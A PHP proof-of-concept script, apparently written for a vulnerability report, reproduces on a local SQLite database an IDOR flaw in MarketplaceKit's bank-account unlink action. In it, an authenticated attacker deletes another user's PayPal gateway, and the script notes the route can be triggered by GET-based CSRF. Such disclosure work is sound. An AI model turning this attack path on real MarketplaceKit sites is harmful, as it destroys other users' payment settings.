<?php
/**
 * Local logic-level reproduction of MarketplaceKit BankAccountController@unlink.
 *
 * This script intentionally mirrors the vulnerable data flow:
 *   PaymentProvider::find($provider)->identifier->id
 *   PaymentGateway::find(...)->delete()
 *
 * It uses a local SQLite database so the destructive behavior can be shown
 * safely without a real payment provider or production MarketplaceKit instance.
 */
$dbPath = '/tmp/marketplacekit-idor.sqlite';
@unlink($dbPath);
$pdo = new PDO('sqlite:' . $dbPath);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$pdo->exec('CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)');
$pdo->exec('CREATE TABLE payment_providers (id INTEGER PRIMARY KEY, `key` TEXT NOT NULL, name TEXT, is_enabled INTEGER NOT NULL DEFAULT 1)');
$pdo->exec('CREATE TABLE payment_gateways (id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL, name TEXT NOT NULL, gateway_id TEXT, token TEXT, metadata TEXT)');

$pdo->exec("INSERT INTO users (id, name) VALUES (1, 'Alice victim'), (2, 'Bob attacker')");
$pdo->exec("INSERT INTO payment_providers (id, `key`, name, is_enabled) VALUES (2, 'paypal', 'PayPal', 1)");

// Victim Alice owns the PayPal gateway row. Bob is the authenticated attacker.
$pdo->exec("INSERT INTO payment_gateways (id, user_id, name, gateway_id) VALUES (10, 1, 'paypal', 'alice-paypal-gateway')");

$currentUserId = 2;      // Bob attacker
$providerId = 2;         // Shared PayPal provider id

function countGateways(PDO $pdo, int $userId): int {
    $stmt = $pdo->prepare('SELECT COUNT(*) FROM payment_gateways WHERE user_id = ?');
    $stmt->execute([$userId]);
    return (int) $stmt->fetchColumn();
}

function vulnerable_unlink(PDO $pdo, int $providerId): ?int {
    // MarketplaceKit: $provider = PaymentProvider::find($provider)
    $stmt = $pdo->prepare('SELECT * FROM payment_providers WHERE id = ? LIMIT 1');
    $stmt->execute([$providerId]);
    $provider = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$provider) {
        throw new RuntimeException('Provider not found');
    }

    // MarketplaceKit relation equivalent:
    // PaymentProvider::identifier() => hasOne(PaymentGateway, 'name', 'key')
    // Missing condition: payment_gateways.user_id = auth()->id()
    $stmt = $pdo->prepare('SELECT * FROM payment_gateways WHERE name = ? ORDER BY id ASC LIMIT 1');
    $stmt->execute([$provider['key']]);
    $identifier = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$identifier) {
        return null;
    }

    // MarketplaceKit: PaymentGateway::find($provider->identifier->id)->delete()
    $stmt = $pdo->prepare('DELETE FROM payment_gateways WHERE id = ?');
    $stmt->execute([$identifier['id']]);
    return (int) $identifier['id'];
}

echo "[*] Authenticated user id: {$currentUserId} (Bob attacker)\n";
echo "[*] Provider id selected by attacker-controlled route parameter: {$providerId}\n";
echo "[*] Victim Alice gateway count before unlink: " . countGateways($pdo, 1) . "\n";
echo "[*] Bob attacker gateway count before unlink: " . countGateways($pdo, 2) . "\n";

$deletedId = vulnerable_unlink($pdo, $providerId);

echo "[*] Deleted payment_gateways.id: " . var_export($deletedId, true) . "\n";
echo "[*] Victim Alice gateway count after unlink: " . countGateways($pdo, 1) . "\n";
echo "[*] Bob attacker gateway count after unlink: " . countGateways($pdo, 2) . "\n";

if ($deletedId === 10 && countGateways($pdo, 1) === 0 && countGateways($pdo, 2) === 0) {
    echo "[+] IDOR reproduced: Bob's unlink operation deleted Alice's payment gateway through the unscoped provider relation.\n";
    echo "[+] GET-CSRF condition: the real route is a GET URL, so an authenticated browser can trigger it with an image/link request.\n";
    exit(0);
}

fwrite(STDERR, "[!] Reproduction failed: expected Alice's gateway to be deleted.\n");
exit(1);
